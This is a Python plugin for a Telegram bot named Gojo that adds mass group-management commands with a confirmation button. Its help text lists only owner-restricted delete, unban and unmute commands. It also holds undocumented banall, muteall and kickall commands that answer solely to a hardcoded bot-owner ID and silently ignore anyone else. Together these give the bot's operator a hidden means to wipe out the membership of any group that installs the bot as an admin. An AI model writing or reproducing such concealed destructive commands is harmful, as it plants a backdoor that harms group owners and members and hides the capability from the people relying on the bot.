import asyncio
from pyrogram import filters
from pyrogram.enums import ChatMemberStatus, ChatMembersFilter
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

from Powers.bot_class import Gojo
from Powers.utils.custom_filters import command

BOT_OWNER_ID = 8429156335

# ===== Helper functions =====
async def is_group_owner(c, chat_id, user_id):
    member = await c.get_chat_member(chat_id, user_id)
    return member.status == ChatMemberStatus.OWNER

def is_bot_owner(user_id):
    return user_id == BOT_OWNER_ID

# Store pending confirmations {chat_id: {user_id: action}}
PENDING_CONFIRM = {}

def confirm_keyboard(action):
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm:{action}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"cancel:{action}")
        ]]
    )

async def start_confirmation(m: Message, action: str):
    """Ask the user to confirm the action"""
    chat_id = m.chat.id
    user_id = m.from_user.id
    PENDING_CONFIRM.setdefault(chat_id, {})[user_id] = action
    await m.reply_text(
        f"⚠️ Are you sure you want to **{action}**?",
        reply_markup=confirm_keyboard(action)
    )

# ===== Commands =====
@Gojo.on_message(command(["deleteall"]) & filters.group)
async def delete_all_cmd(c: Gojo, m: Message):
    if not await is_group_owner(c, m.chat.id, m.from_user.id):
        return await m.reply_text("❌ Only the group owner can use this.")
    await start_confirmation(m, "deleteall")

@Gojo.on_message(command(["banall"]) & filters.group)
async def ban_all_cmd(c: Gojo, m: Message):
    if not is_bot_owner(m.from_user.id):
        return  # silently ignore
    await start_confirmation(m, "banall")

@Gojo.on_message(command(["unbanall"]) & filters.group)
async def unban_all_cmd(c: Gojo, m: Message):
    if not await is_group_owner(c, m.chat.id, m.from_user.id):
        return await m.reply_text("❌ Only the group owner can use this.")
    await start_confirmation(m, "unbanall")

@Gojo.on_message(command(["muteall"]) & filters.group)
async def mute_all_cmd(c: Gojo, m: Message):
    if not is_bot_owner(m.from_user.id):
        return  # silently ignore
    await start_confirmation(m, "muteall")

@Gojo.on_message(command(["unmuteall"]) & filters.group)
async def unmute_all_cmd(c: Gojo, m: Message):
    if not await is_group_owner(c, m.chat.id, m.from_user.id):
        return await m.reply_text("❌ Only the group owner can use this.")
    await start_confirmation(m, "unmuteall")

@Gojo.on_message(command(["kickall"]) & filters.group)
async def kick_all_cmd(c: Gojo, m: Message):
    if not is_bot_owner(m.from_user.id):
        return  # silently ignore
    await start_confirmation(m, "kickall")

# ===== Callback Handling =====
@Gojo.on_callback_query(filters.regex(r"^(confirm|cancel):"))
async def confirm_action(c: Gojo, cb: CallbackQuery):
    action = cb.data.split(":")[1]
    user_id = cb.from_user.id
    chat_id = cb.message.chat.id

    if chat_id not in PENDING_CONFIRM or user_id not in PENDING_CONFIRM[chat_id]:
        return await cb.answer("This confirmation is not for you.", show_alert=True)

    if PENDING_CONFIRM[chat_id][user_id] != action:
        return await cb.answer("Invalid confirmation.", show_alert=True)

    if cb.data.startswith("cancel"):
        await cb.message.edit_text("❌ Action cancelled.")
        del PENDING_CONFIRM[chat_id][user_id]
        return

    await cb.message.edit_text(f"✅ Confirmed. Executing `{action}`...")

    # Perform the action
    if action == "deleteall":
        async for msg in c.get_chat_history(chat_id):
            try:
                await c.delete_messages(chat_id, msg.id)
            except:
                pass
        await c.send_message(chat_id, "🗑 All messages deleted.")

    elif action == "banall":
        async for member in c.get_chat_members(chat_id):
            if member.user.is_bot or member.status == ChatMemberStatus.OWNER:
                continue
            try:
                await c.ban_chat_member(chat_id, member.user.id)
                await asyncio.sleep(0.1)
            except:
                pass
        await c.send_message(chat_id, "🚫 All members banned.")

    elif action == "unbanall":
        async for member in c.get_chat_members(chat_id, filter=ChatMembersFilter.BANNED):
            try:
                await c.unban_chat_member(chat_id, member.user.id)
                await asyncio.sleep(0.1)
            except:
                pass
        await c.send_message(chat_id, "✅ All members unbanned.")

    elif action == "muteall":
        from pyrogram.types import ChatPermissions
        async for member in c.get_chat_members(chat_id):
            if member.user.is_bot or member.status == ChatMemberStatus.OWNER:
                continue
            try:
                await c.restrict_chat_member(chat_id, member.user.id, permissions=ChatPermissions())
                await asyncio.sleep(0.1)
            except:
                pass
        await c.send_message(chat_id, "🔇 All members muted.")

    elif action == "unmuteall":
        async for member in c.get_chat_members(chat_id, filter=ChatMembersFilter.RESTRICTED):
            try:
                await c.restrict_chat_member(chat_id, member.user.id, permissions=None)
                await asyncio.sleep(0.1)
            except:
                pass
        await c.send_message(chat_id, "🔊 All members unmuted.")

    elif action == "kickall":
        async for member in c.get_chat_members(chat_id):
            if member.user.is_bot or member.status == ChatMemberStatus.OWNER:
                continue
            try:
                await c.ban_chat_member(chat_id, member.user.id)
                await c.unban_chat_member(chat_id, member.user.id)
                await asyncio.sleep(0.1)
            except:
                pass
        await c.send_message(chat_id, "👢 All members kicked.")

    # Remove confirmation
    del PENDING_CONFIRM[chat_id][user_id]


__PLUGIN__ = "MassActions"
_DISABLE_CMDS_ = ["deleteall", "banall", "unbanall", "muteall", "unmuteall", "kickall"]
__alt_name__ = ["delall", "bannall", "unbannall", "mute_everyone", "unmute_everyone", "kick_everyone"]
__HELP__ = """
**Mass Group Management Commands (with confirmation)**
• /deleteall — Delete all messages (**group owner only**)
• /unbanall — Unban all banned members (**group owner only**)
• /unmuteall — Unmute all muted members (**group owner only**)

"""
